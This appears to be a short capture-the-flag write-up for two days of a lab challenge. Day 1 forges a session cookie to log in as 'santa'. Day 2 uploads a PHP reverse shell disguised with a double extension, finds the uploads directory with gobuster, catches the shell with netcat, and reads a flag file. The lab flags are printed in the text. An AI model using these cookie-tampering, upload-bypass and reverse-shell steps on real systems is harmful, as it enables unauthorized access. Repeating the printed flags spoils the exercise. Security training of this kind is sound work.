# Day 1
* We can go onto the website and regsiter/login.
* Once we do that, viewing the cookies shows us a hexidecimal value named "auth"
* We can decode that with `echo <hex_string> | xxd -r -p`
* We want to log in to "santa", so let's switch our user for that with the following command:
* `echo <hex_string> | xxd -r -p | sed s/<your_username>/santa/g | xxd -p`
* Once we replace the value of the previous cookie with the new one in the "Applications->Cookies" section on chrome developer tools, we get authenticated as santa and can turn on all the controls
* The flag is `THM{MjY0Yzg5NTJmY2Q1NzM1NjBmZWFhYmQy}` 


# Day 2
* My ID number was `ODIzODI5MTNiYmYw`
	* We can then go to the website and enter that in as a GET parameter:
	* `http://10.10.71.84/?id=ODIzODI5MTNiYmYw`
* There's a place images, so let's try to upload a malicious script - a reverse shell
* I got a php reverse shell [here](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
        * Make sure you edit your ip to be the one on tun0 and change the port to what you want
```
$ip = '10.6.36.105';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
```
* Uploading the php file doesn't work because the system doesn't allow php extensions
* Looking at the source code shows that the website allows uploads of `.jpeg, .jpg, .png`. Let's try to disguise our script as one of those
	* We can rename the file to `php-reverse-shell.jpg.php`
	* This works because this particular website checks file extensions by splitting on a period and checking the second index
* Now we need to find where the images are stored
	* We can do that with gobuster:
* `gobuster dir -u "http://10.10.71.84/" -w /usr/share/wordlists/dirb/common.txt" -b "200"
	* We include a blacklist for status codes of 200 because the website will return a 200 for any directory you put in
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:                     http://10.10.71.84/
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   200
[+] User Agent:              gobuster/3.0.1
[+] Timeout:                 10s
===============================================================
2020/12/02 19:04:07 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/assets (Status: 301)
/cgi-bin/ (Status: 403)
/noindex (Status: 301)
/uploads (Status: 301)
===============================================================
2020/12/02 19:04:58 Finished
===============================================================
```
* We can see that `/uploads` is a valid directory. Going there on `http://10.10.71.84/uploads/` shows our uploaded shell

* Now we can set up a reverse listener on our machine with `nc -lvnp 1337`
	* Remember to use the same port as the one on the reverse shell script
* To run the script on their server, we can simply click on it
	* We get a shell!
* Now we can `cat /var/www/flag.txt` to get the flag: `THM{MGU3Y2UyMGUwNjExYTY4NTAxOWJhMzhh}`
